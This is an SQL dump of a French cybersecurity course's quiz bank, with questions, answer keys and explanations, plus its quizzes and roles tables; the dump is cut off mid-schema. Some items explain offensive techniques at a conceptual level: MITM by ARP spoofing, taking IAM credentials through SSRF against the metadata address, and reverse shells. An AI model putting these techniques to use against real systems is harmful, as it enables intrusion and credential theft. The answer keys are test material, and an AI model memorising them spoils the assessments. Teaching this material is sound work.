INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol1_ch1_2','quiz_les_cp_vol1_ch1','multiple_choice','Pourquoi utilise-t-on `secrets.compare_digest()` plutôt que l''opérateur classique `==` pour comparer deux empreintes cryptographiques ?','`secrets.compare_digest()` effectue une comparaison en temps constant, ce qui empêche un attaquant de déduire les octets valides en mesurant les variations de temps de calcul (Timing Attacks).','[{"text": "Pour emp\u00eacher les fuites par canaux auxiliaires temporels (Timing Attacks)", "is_correct": true}, {"text": "Parce que l''op\u00e9rateur == ne supporte pas les cha\u00eenes de plus de 32 caract\u00e8res", "is_correct": false}, {"text": "Pour convertir automatiquement la cha\u00eene en majuscules", "is_correct": false}, {"text": "Parce que compare_digest chiffre la m\u00e9moire RAM", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol1_ch2_1','quiz_les_cp_vol1_ch2','multiple_choice','Quelle condition légale est indispensable pour débuter un test d''intrusion sur l''infrastructure d''un client ?','L''Ordre de Mission signé (Rules of Engagement) est le seul document juridique qui autorise formellement l''auditeur à sonder les systèmes cibles sans enfreindre l''art. 323-1.','[{"text": "Un ordre de mission (RoE) \u00e9crit, dat\u00e9 et sign\u00e9 d\u00e9limitant le p\u00e9rim\u00e8tre", "is_correct": true}, {"text": "Un accord verbal donn\u00e9 lors d''une r\u00e9union informelle", "is_correct": false}, {"text": "Une attestation de r\u00e9ussite \u00e0 une certification de pentest", "is_correct": false}, {"text": "L''utilisation exclusive d''adresses IP anonymis\u00e9es par VPN", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol1_ch2_2','quiz_les_cp_vol1_ch2','multiple_choice','Quelle est la peine maximale prévue par l''article 323-1 du Code Pénal pour un accès et maintien frauduleux simple dans un STAD ?','L''article 323-1 alinéa 1 prévoit jusqu''à trois ans d''emprisonnement et 100 000 euros d''amende.','[{"text": "3 ans d''emprisonnement et 100 000 \u20ac d''amende", "is_correct": true}, {"text": "6 mois avec sursis et 5 000 \u20ac d''amende", "is_correct": false}, {"text": "10 ans de r\u00e9clusion criminelle", "is_correct": false}, {"text": "Une simple injonction administrative de l''ANSSI", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol1_ch3_1','quiz_les_cp_vol1_ch3','multiple_choice','Quel registre processeur contient l''adresse mémoire de la prochaine instruction en langage machine à exécuter ?','RIP (Instruction Pointer en 64 bits) ou EIP (en 32 bits) pointe sur la prochaine instruction à charger par le CPU.','[{"text": "RIP (Instruction Pointer)", "is_correct": true}, {"text": "RSP (Stack Pointer)", "is_correct": false}, {"text": "RAX (Accumulator Register)", "is_correct": false}, {"text": "RBP (Base Pointer)", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol1_ch3_2','quiz_les_cp_vol1_ch3','multiple_choice','Quel mécanisme de sécurité du système d''exploitation rend aléatoires les adresses mémoire de la pile et du tas à chaque lancement de programme ?','L''ASLR (Address Space Layout Randomization) empêche un attaquant de prédire avec certitude les adresses mémoire lors de l''exploitation d''une faille de corruption de mémoire.','[{"text": "L''ASLR (Address Space Layout Randomization)", "is_correct": true}, {"text": "Le bit NX / DEP", "is_correct": false}, {"text": "Le pare-feu iptables", "is_correct": false}, {"text": "Le contr\u00f4le de compte d''utilisateur (UAC)", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol1_lab1_1','quiz_les_cp_vol1_lab1','multiple_choice','Quel mode réseau VirtualBox garantit que le trafic entre les VMs ne sortira jamais sur le réseau local physique de votre domicile ?','Le mode Réseau Privé Hôte (Host-Only) isole le trafic au sein d''un commutateur virtuel interne sur votre machine hôte.','[{"text": "R\u00e9seau priv\u00e9 h\u00f4te (Host-Only)", "is_correct": true}, {"text": "Acc\u00e8s par pont (Bridged)", "is_correct": false}, {"text": "NAT simple avec redirection de ports", "is_correct": false}, {"text": "R\u00e9seau g\u00e9n\u00e9rique", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol1_lab1_2','quiz_les_cp_vol1_lab1','multiple_choice','Combien d''hôtes IP utilisables contient un sous-réseau au masque CIDR /24 (255.255.255.0) ?','Un /24 dispose de 2^(32-24) = 256 adresses, moins l''adresse réseau (.0) et le broadcast (.255), soit 254 hôtes utilisables.','[{"text": "254 h\u00f4tes", "is_correct": true}, {"text": "256 h\u00f4tes", "is_correct": false}, {"text": "512 h\u00f4tes", "is_correct": false}, {"text": "128 h\u00f4tes", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol2_ch6_1','quiz_les_cp_vol2_ch6','multiple_choice','Quelle commande permet de rediriger la sortie d''erreur (stderr) vers le fichier /dev/null sans impacter la sortie standard ?','Le chiffre 2 désigne le descripteur de fichier de stderr, donc `2>/dev/null` redirige spécifiquement les erreurs.','[{"text": "2>/dev/null", "is_correct": true}, {"text": "1>/dev/null", "is_correct": false}, {"text": ">> /dev/null", "is_correct": false}, {"text": "< /dev/null", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol2_ch6_2','quiz_les_cp_vol2_ch6','multiple_choice','Pourquoi les binaires possédant le bit de permission SUID (valeur octale 4000) intéressent-ils particulièrement les auditeurs en phase d''élévation de privilèges ?','Un binaire SUID appartenant à root s''exécute avec les privilèges de root même s''il est lancé par un utilisateur ordinaire, offrant un vecteur d''escalade en cas de faille.','[{"text": "Car ils s''ex\u00e9cutent avec les privil\u00e8ges de leur propri\u00e9taire (souvent root)", "is_correct": true}, {"text": "Car ils sont automatiquement chiffr\u00e9s en m\u00e9moire", "is_correct": false}, {"text": "Car ils contournent le pare-feu du noyau", "is_correct": false}, {"text": "Car ils ne peuvent jamais \u00eatre effac\u00e9s par l''administrateur", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol2_proj1_1','quiz_les_cp_vol2_proj1','multiple_choice','Quelle directive dans /etc/ssh/sshd_config permet d''interdire totalement la connexion directe de l''administrateur suprême via SSH ?','`PermitRootLogin no` bloque toute tentative de connexion SSH en tant que root, obligeant les administrateurs à se connecter avec un compte nominatif puis à utiliser `sudo`.','[{"text": "PermitRootLogin no", "is_correct": true}, {"text": "DenyRoot yes", "is_correct": false}, {"text": "DisableUser root", "is_correct": false}, {"text": "RootAuth false", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol2_proj1_2','quiz_les_cp_vol2_proj1','multiple_choice','Que signifie la directive `set -euo pipefail` placée au début d''un script d''administration Bash professionnel ?','Elle force le script à s''interrompre immédiatement en cas d''erreur de commande (-e), de variable non initialisée (-u) ou d''échec au sein d''un pipeline (-o pipefail).','[{"text": "Interrompre imm\u00e9diatement le script en cas d''erreur ou de variable ind\u00e9finie", "is_correct": true}, {"text": "Ex\u00e9cuter le script en mode multi-c\u0153urs", "is_correct": false}, {"text": "D\u00e9sactiver l''affichage des logs dans la console", "is_correct": false}, {"text": "Chiffrer le code source du script en m\u00e9moire", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol3_ch9_1','quiz_les_cp_vol3_ch9','multiple_choice','Quelle structure de données de la bibliothèque standard Python offre une complexité temporelle de O(1) pour l''ajout et le retrait d''éléments à ses deux extrémités ?','`collections.deque` est implémentée sous forme de liste doublement chaînée optimisée pour l''insertion et l''extraction rapide en tête et en queue.','[{"text": "collections.deque", "is_correct": true}, {"text": "list", "is_correct": false}, {"text": "tuple", "is_correct": false}, {"text": "collections.OrderedDict", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol3_ch9_2','quiz_les_cp_vol3_ch9','multiple_choice','À quoi servent les annotations de type PEP 484 lors de l''exécution normale par le runtime CPython standard ?','En Python standard, les annotations de type ne modifient pas l''exécution ni les performances : elles sont conservées dans `__annotations__` et servent aux linters statiques (mypy) et aux IDE.','[{"text": "Elles sont ignor\u00e9es \u00e0 l''ex\u00e9cution mais valid\u00e9es par les analyseurs statiques (mypy)", "is_correct": true}, {"text": "Elles provoquent un plantage imm\u00e9diat si une variable re\u00e7oit un autre type", "is_correct": false}, {"text": "Elles compilent le script en code assembleur natif x86_64", "is_correct": false}, {"text": "Elles chiffront les variables locales en m\u00e9moire", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol3_ch10_1','quiz_les_cp_vol3_ch10','multiple_choice','Quelle méthode spéciale Python permet de définir le comportement de l''opérateur d''égalité == entre deux instances d''une classe ?','La méthode `__eq__(self, other)` est appelée automatiquement par Python lors de l''évaluation de `a == b`.','[{"text": "__eq__", "is_correct": true}, {"text": "__cmp__", "is_correct": false}, {"text": "__equals__", "is_correct": false}, {"text": "__match__", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol3_ch10_2','quiz_les_cp_vol3_ch10','multiple_choice','Quelles sont les deux méthodes obligatoires qu''une classe doit implémenter pour pouvoir être utilisée avec l''instruction ''with'' ?','Le protocole de Context Manager requiert `__enter__` (qui alloue la ressource) et `__exit__` (qui la libère à la fin du bloc).','[{"text": "__enter__ et __exit__", "is_correct": true}, {"text": "__init__ et __del__", "is_correct": false}, {"text": "__start__ et __stop__", "is_correct": false}, {"text": "__open__ et __close__", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol4_ch12_1','quiz_les_cp_vol4_ch12','multiple_choice','À quelle unité de données (PDU) correspond le niveau de la Couche 2 (Liaison de données) dans le modèle OSI ?','En Couche 2, les unités de données manipulées sont appelées des Trames (Frames). En Couche 3, ce sont des Paquets, et en Couche 4, des Segments.','[{"text": "Une Trame (Frame)", "is_correct": true}, {"text": "Un Paquet (Packet)", "is_correct": false}, {"text": "Un Segment", "is_correct": false}, {"text": "Un Datagramme", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol4_ch12_2','quiz_les_cp_vol4_ch12','multiple_choice','Quel protocole réseau permet à une machine de découvrir l''adresse MAC matérielle correspondant à une adresse IPv4 locale ?','ARP (Address Resolution Protocol - RFC 826) résout les adresses IP en adresses physiques MAC au sein du domaine de diffusion local.','[{"text": "ARP (Address Resolution Protocol)", "is_correct": true}, {"text": "DNS (Domain Name System)", "is_correct": false}, {"text": "DHCP (Dynamic Host Configuration Protocol)", "is_correct": false}, {"text": "BGP (Border Gateway Protocol)", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol4_ch14_1','quiz_les_cp_vol4_ch14','multiple_choice','Quel paquet est renvoyé par un système d''exploitation standard lorsqu''il reçoit un segment SYN sur un port TCP fermé ?','Conformément à la RFC 793, un port fermé répond par un segment portant le drapeau RST (Reset) pour notifier le rejet de la connexion.','[{"text": "Un paquet RST (Reset)", "is_correct": true}, {"text": "Un paquet FIN (Finish)", "is_correct": false}, {"text": "Un paquet ICMP Echo Reply", "is_correct": false}, {"text": "Aucune r\u00e9ponse (Drop silencieux)", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol4_ch14_2','quiz_les_cp_vol4_ch14','multiple_choice','Comment la technologie des SYN Cookies protège-t-elle un serveur contre les attaques de déni de service SYN Flood ?','Les SYN Cookies permettent de ne pas allouer d''espace mémoire dans la table des sessions tant que le client n''a pas renvoyé le segment ACK final validant le cookie.','[{"text": "En \u00e9vitant d''allouer de la m\u00e9moire tant que le handshake n''est pas finalis\u00e9", "is_correct": true}, {"text": "En bloquant automatiquement l''adresse IP de l''attaquant au niveau du commutateur", "is_correct": false}, {"text": "En basculant le trafic TCP sur le protocole UDP", "is_correct": false}, {"text": "En chiffrant les donn\u00e9es transmises en RSA-4096", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol5_scapy_1','quiz_les_cp_vol5_scapy','multiple_choice','Quel opérateur Python est surchargé par Scapy pour empiler les différentes couches de protocoles réseau ?','Scapy surcharge l''opérateur de division `/` pour assembler les couches, par exemple : `Ether() / IP() / TCP()`.','[{"text": "L''op\u00e9rateur de division /", "is_correct": true}, {"text": "L''op\u00e9rateur d''addition +", "is_correct": false}, {"text": "L''op\u00e9rateur pipe |", "is_correct": false}, {"text": "L''op\u00e9rateur de d\u00e9calage >>", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol5_scapy_2','quiz_les_cp_vol5_scapy','multiple_choice','Quelle fonction Scapy doit être utilisée lorsqu''on souhaite envoyer une trame personnalisée de niveau Couche 2 (incluant Ether()) ?','`sendp()` permet l''émission directe au niveau Couche 2 (Liaison de données), alors que `send()` opère en Couche 3.','[{"text": "sendp()", "is_correct": true}, {"text": "send()", "is_correct": false}, {"text": "emit()", "is_correct": false}, {"text": "inject()", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol5_arp_1','quiz_les_cp_vol5_arp','multiple_choice','Pourquoi l''attaquant doit-il impérativement activer ''net.ipv4.ip_forward = 1'' sur sa machine Linux lors d''une attaque Man-in-the-Middle ?','Par défaut, Linux rejette les paquets dont l''IP de destination ne lui appartient pas. L''activation du forward IP permet au noyau de retransmettre les paquets interceptés vers leur vraie destination pour ne pas couper Internet à la victime.','[{"text": "Pour retransmettre les paquets intercept\u00e9s vers leur destination r\u00e9elle sans bloquer la victime", "is_correct": true}, {"text": "Pour masquer l''adresse MAC de l''attaquant dans les logs", "is_correct": false}, {"text": "Pour forcer le chiffrement automatique du trafic en HTTPS", "is_correct": false}, {"text": "Pour saturer la bande passante du routeur", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol5_arp_2','quiz_les_cp_vol5_arp','multiple_choice','Quelle technologie sur les commutateurs réseau managés (switches) permet de bloquer automatiquement les attaques d''ARP Spoofing ?','Dynamic ARP Inspection (DAI) vérifie la validité des trames ARP en les confrontant à la table de baux du DHCP Snooping.','[{"text": "Dynamic ARP Inspection (DAI)", "is_correct": true}, {"text": "Spanning Tree Protocol (STP)", "is_correct": false}, {"text": "Network Address Translation (NAT)", "is_correct": false}, {"text": "VLAN Trunking Protocol (VTP)", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol6_sqli_1','quiz_les_cp_vol6_sqli','multiple_choice','Pourquoi l''utilisation de requêtes préparées (Prepared Statements) élimine-t-elle le risque d''injection SQL ?','Le SGBD sépare la structure de la commande SQL de ses données. Les entrées utilisateur sont transmises après la compilation et sont strictement traitées comme des chaînes littérales.','[{"text": "Car le SGBD s\u00e9pare la phase d''analyse syntaxique du traitement des donn\u00e9es transmises", "is_correct": true}, {"text": "Car elle supprime automatiquement les guillemets des entr\u00e9es utilisateur", "is_correct": false}, {"text": "Car elle chiffre la base de donn\u00e9es avec AES-256", "is_correct": false}, {"text": "Car elle interdit l''utilisation de comptes administrateurs", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol6_sqli_2','quiz_les_cp_vol6_sqli','multiple_choice','Comment appelle-t-on la technique d''injection SQL où l''attaquant déduit l''existence d''une information en mesurant le temps de réponse du serveur ?','L''injection SQL aveugle temporelle (Time-Based Blind SQLi) exploite des fonctions comme `sleep()` ou `pg_sleep()` pour exfiltrer des données par inférence temporelle.','[{"text": "Time-Based Blind SQL Injection", "is_correct": true}, {"text": "UNION-Based SQL Injection", "is_correct": false}, {"text": "Error-Based SQL Injection", "is_correct": false}, {"text": "Cross-Site Scripting (XSS)", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol7_owasp_1','quiz_les_cp_vol7_owasp','multiple_choice','Quel drapeau de cookie HTTP empêche formellement un script JavaScript malveillant d''accéder au jeton de session via document.cookie ?','Le drapeau `HttpOnly` interdit l''accès au cookie depuis l''API DOM/JavaScript du navigateur, neutralisant le vol de session par XSS.','[{"text": "HttpOnly", "is_correct": true}, {"text": "Secure", "is_correct": false}, {"text": "SameSite=Strict", "is_correct": false}, {"text": "Domain", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol7_owasp_2','quiz_les_cp_vol7_owasp','multiple_choice','Quelle adresse IP spécifique est fréquemment ciblée lors d''une attaque SSRF sur des environnements Cloud AWS afin d''extraire les identifiants IAM d''une instance ?','`http://169.254.169.254` est l''adresse de métadonnées d''instance (IMDS) sur AWS, Azure et GCP.','[{"text": "169.254.169.254 (Instance Metadata Service)", "is_correct": true}, {"text": "127.0.0.1", "is_correct": false}, {"text": "192.168.1.1", "is_correct": false}, {"text": "8.8.8.8", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol8_nmap_1','quiz_les_cp_vol8_nmap','multiple_choice','Pourquoi le scan SYN (-sS) de Nmap est-il qualifié de ''furtif'' (Stealth Scan) par rapport au Connect scan (-sT) ?','Nmap envoie un paquet RST dès réception du SYN-ACK, annulant la connexion avant qu''elle ne soit complétée, ce qui évite que l''application applicative n''enregistre la connexion dans ses logs habituels.','[{"text": "Car il envoie un RST apr\u00e8s le SYN-ACK et n''ach\u00e8ve jamais la connexion TCP", "is_correct": true}, {"text": "Car il chiffre tous ses paquets avec AES-GCM", "is_correct": false}, {"text": "Car il utilise des adresses IP satellites", "is_correct": false}, {"text": "Car il ne transmet aucun paquet sur le r\u00e9seau", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol8_nmap_2','quiz_les_cp_vol8_nmap','multiple_choice','Quelle option de Nmap permet d''exécuter l''ensemble des scripts de détection standard écrits en langage Lua ?','L''option `-sC` (équivalente à `--script=default`) active les scripts NSE sûrs et standard pour identifier les versions et vulnérabilités évidentes.','[{"text": "-sC (ou --script=default)", "is_correct": true}, {"text": "-sS", "is_correct": false}, {"text": "-sU", "is_correct": false}, {"text": "-sP", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol9_sockets_1','quiz_les_cp_vol9_sockets','multiple_choice','Pourquoi l''instruction ''cd'' doit-elle être gérée de manière spécifique avec os.chdir() plutôt que transmise simplement à subprocess.check_output() ?','`subprocess.check_output()` lance un sous-processus éphémère. Si on y exécute `cd`, le répertoire ne change que dans le processus fils qui s''éteint immédiatement, sans impacter le processus Python persistant.','[{"text": "Car subprocess s''ex\u00e9cute dans un processus fils isol\u00e9 qui ne modifie pas l''environnement du parent", "is_correct": true}, {"text": "Car le shell Linux interdit l''utilisation de cd en ligne de commande", "is_correct": false}, {"text": "Car les sockets TCP ne supportent pas les cha\u00eenes de caract\u00e8res courtes", "is_correct": false}, {"text": "Car os.chdir() chiffre les fichiers syst\u00e8me", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol9_sockets_2','quiz_les_cp_vol9_sockets','multiple_choice','Quel avantage décisif offre un Reverse Shell par rapport à un Bind Shell face à un réseau d''entreprise protégé par un routeur NAT ?','Un Reverse Shell génère une connexion sortante initiée depuis la machine interne, ce qui traverse automatiquement les passerelles NAT et la plupart des pare-feux.','[{"text": "Il initie une connexion sortante qui traverse naturellement les routeurs NAT et pare-feux", "is_correct": true}, {"text": "Il contourne automatiquement les mots de passe root", "is_correct": false}, {"text": "Il fonctionne sans installer Python sur la cible", "is_correct": false}, {"text": "Il d\u00e9sactive automatiquement Windows Defender", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol10_crypto_1','quiz_les_cp_vol10_crypto','multiple_choice','Quel avantage décisif offre le mode AES-GCM (Galois/Counter Mode) par rapport au mode classique AES-CBC ?','AES-GCM est un mode AEAD qui intègre nativement l''authentification et l''intégrité grâce à un tag cryptographique, évitant les attaques par oracle de rembourrage (Padding Oracle).','[{"text": "Il garantit \u00e0 la fois la confidentialit\u00e9 et l''int\u00e9grit\u00e9 des donn\u00e9es (chiffrement authentifi\u00e9 AEAD)", "is_correct": true}, {"text": "Il n''a pas besoin de cl\u00e9 secr\u00e8te", "is_correct": false}, {"text": "Il compresse automatiquement les donn\u00e9es de 50%", "is_correct": false}, {"text": "Il fonctionne sans processeur", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol10_crypto_2','quiz_les_cp_vol10_crypto','multiple_choice','Dans un système de signature numérique asymétrique, quelle clé est utilisée par l''émetteur pour signer l''empreinte d''un document ?','L''émetteur signe avec sa propre clé privée, et les destinataires valident la signature à l''aide de sa clé publique.','[{"text": "La cl\u00e9 priv\u00e9e de l''\u00e9metteur", "is_correct": true}, {"text": "La cl\u00e9 publique du destinataire", "is_correct": false}, {"text": "La cl\u00e9 sym\u00e9trique AES de session", "is_correct": false}, {"text": "Le certificat racine de l''autorit\u00e9", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol11_soc_1','quiz_les_cp_vol11_soc','multiple_choice','À quoi servent les règles de détection au format universel Sigma au sein d''une équipe de cyberdéfense ?','Sigma est un format générique et ouvert permettant d''écrire des règles de détection d''incidents qui peuvent être compilées et exportées vers n''importe quel SIEM (Splunk, Elastic, Sentinel...).','[{"text": "\u00c0 d\u00e9crire des r\u00e8gles de d\u00e9tection de comportements suspects portables sur n''importe quel SIEM", "is_correct": true}, {"text": "\u00c0 d\u00e9sinfecter automatiquement les postes de travail infect\u00e9s par un ransomware", "is_correct": false}, {"text": "\u00c0 remplacer les analystes humains de niveau L1", "is_correct": false}, {"text": "\u00c0 bloquer les ports de commutateurs r\u00e9seau", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol11_soc_2','quiz_les_cp_vol11_soc','multiple_choice','Quelle est la mission principale d''un analyste de sécurité SOC de Niveau 1 (L1) ?','L''analyste L1 surveille les flux d''alertes en temps réel, élimine les faux positifs et qualifie les événements suspects avant escalade.','[{"text": "Le triage, la qualification initiale des alertes et l''\u00e9limination des faux positifs", "is_correct": true}, {"text": "La r\u00e9tro-ing\u00e9nierie assembleur des malwares de pointe", "is_correct": false}, {"text": "La n\u00e9gociation contractuelle avec les clients", "is_correct": false}, {"text": "Le reconditionnement physique des serveurs en panne", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol12_forensics_1','quiz_les_cp_vol12_forensics','multiple_choice','Selon la RFC 3227, quel composant doit être capturé en priorité absolue lors de la réponse à incident sur un poste compromis en marche ?','La mémoire vive (RAM) et l''état des registres sont les plus volatils et disparaissent immédiatement dès la coupure d''alimentation.','[{"text": "La m\u00e9moire vive (RAM) et l''\u00e9tat des registres", "is_correct": true}, {"text": "Le disque dur SSD", "is_correct": false}, {"text": "La table des partitions NTFS", "is_correct": false}, {"text": "Les sauvegardes sur bandes magn\u00e9tiques", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol12_forensics_2','quiz_les_cp_vol12_forensics','multiple_choice','Pourquoi l''expert forensique calcule-t-il systématiquement le hachage SHA-256 de l''image de disque dès la fin de son acquisition ?','Ce hachage constitue le scellé numérique qui prouve que l''image analysée est rigoureusement identique bit-à-bit à la preuve d''origine sans aucune altération.','[{"text": "Pour garantir l''int\u00e9grit\u00e9 de la preuve et maintenir la cha\u00eene de tra\u00e7abilit\u00e9 (Chain of Custody)", "is_correct": true}, {"text": "Pour compresser l''image disque et \u00e9conomiser du stockage", "is_correct": false}, {"text": "Pour emp\u00eacher le red\u00e9marrage de la machine victime", "is_correct": false}, {"text": "Pour d\u00e9sactiver les malwares r\u00e9siduels", "is_correct": false}]',NULL,10.0,2);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol12_capstone_1','quiz_les_cp_vol12_capstone','multiple_choice','Quelle section d''un rapport de test d''intrusion professionnel est spécifiquement rédigée pour les directeurs généraux et décideurs non techniques ?','L''Executive Summary (Résumé managérial) synthétise les risques métiers, les impacts financiers et les priorités stratégiques dans un langage accessible aux décideurs.','[{"text": "Le R\u00e9sum\u00e9 Manag\u00e9rial (Executive Summary)", "is_correct": true}, {"text": "L''annexe des dumps de m\u00e9moire hexad\u00e9cimaux", "is_correct": false}, {"text": "Le code source assembleur des exploits", "is_correct": false}, {"text": "La liste des banni\u00e8res Nmap brutes", "is_correct": false}]',NULL,10.0,1);
INSERT INTO "quiz_questions" VALUES('qq_les_cp_vol12_capstone_2','quiz_les_cp_vol12_capstone','multiple_choice','Dans la métrique de vulnérabilité CVSS 3.1, à partir de quel score numérique une vulnérabilité est-elle formellement classée comme ''CRITIQUE'' ?','Selon le standard CVSS 3.1 du FIRST, tout score compris entre 9.0 et 10.0 est classé comme Critique.','[{"text": "Score sup\u00e9rieur ou \u00e9gal \u00e0 9.0", "is_correct": true}, {"text": "Score sup\u00e9rieur \u00e0 7.0", "is_correct": false}, {"text": "Score sup\u00e9rieur \u00e0 5.0", "is_correct": false}, {"text": "Score \u00e9gal \u00e0 10.0 uniquement", "is_correct": false}]',NULL,10.0,2);
CREATE TABLE quizzes (
    id TEXT PRIMARY KEY,
    lesson_id TEXT,
    course_id TEXT,
    title TEXT NOT NULL,
    description TEXT,
    passing_score REAL NOT NULL DEFAULT 70
        CHECK (passing_score BETWEEN 0 AND 100),
    status TEXT NOT NULL DEFAULT 'draft'
        CHECK (status IN ('draft', 'published', 'archived')),
    CHECK ((lesson_id IS NOT NULL) OR (course_id IS NOT NULL)),
    FOREIGN KEY (lesson_id) REFERENCES lessons(id) ON DELETE CASCADE,
    FOREIGN KEY (course_id) REFERENCES courses(id) ON DELETE CASCADE
);
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol1_ch1','les_cp_vol1_ch1',NULL,'Quiz - Fondements de la Triade CIA',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol1_ch2','les_cp_vol1_ch2',NULL,'Quiz - Déontologie & Droit du Numérique',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol1_ch3','les_cp_vol1_ch3',NULL,'Quiz - Architecture Matérielle & Mémoire',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol1_lab1','les_cp_vol1_lab1',NULL,'Quiz - Virtualisation & Isolation de Lab',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol2_ch6','les_cp_vol2_ch6',NULL,'Quiz - Permissions & Terminal Linux',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol2_proj1','les_cp_vol2_proj1',NULL,'Quiz - Durcissement de Système Linux',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol3_ch9','les_cp_vol3_ch9',NULL,'Quiz - Python Moderne & Typage',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol3_ch10','les_cp_vol3_ch10',NULL,'Quiz - Programmation Orientée Objet',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol4_ch12','les_cp_vol4_ch12',NULL,'Quiz - Modèles Réseau & Encapsulation',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol4_ch14','les_cp_vol4_ch14',NULL,'Quiz - Le Protocole TCP & Handshake',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol5_scapy','les_cp_vol5_scapy',NULL,'Quiz - Manipulation de Paquets Scapy',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol5_arp','les_cp_vol5_arp',NULL,'Quiz - Attaques MITM & Sécurité ARP',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol6_sqli','les_cp_vol6_sqli',NULL,'Quiz - Injections SQL & Défense',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol7_owasp','les_cp_vol7_owasp',NULL,'Quiz - Vulnérabilités Web OWASP',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol8_nmap','les_cp_vol8_nmap',NULL,'Quiz - Cartographie Réseau avec Nmap',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol9_sockets','les_cp_vol9_sockets',NULL,'Quiz - Programmation Réseau de Reverse Shells',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol10_crypto','les_cp_vol10_crypto',NULL,'Quiz - Cryptographie Appliquée',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol11_soc','les_cp_vol11_soc',NULL,'Quiz - Opérations Blue Team & SOC',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol12_forensics','les_cp_vol12_forensics',NULL,'Quiz - Digital Forensics & RFC 3227',NULL,100.0,'published');
INSERT INTO "quizzes" VALUES('quiz_les_cp_vol12_capstone','les_cp_vol12_capstone',NULL,'Quiz - Synthèse & Capstone CyberPath',NULL,100.0,'published');
CREATE TABLE roles (
    id TEXT PRIMARY KEY,
    code TEXT NOT NULL UNIQUE,
    label TEXT NOT NULL
);
INSERT INTO "roles" VALUES('role_super_admin','super_admin','Super Administrator');
INSERT INTO "roles" VALUES('role_editor','editor','Instructor / Editor');
INSERT INTO "roles" VALUES('role_learner','learner','Learner');
CREATE TABLE skills (
    id TEXT PRIMARY KEY,
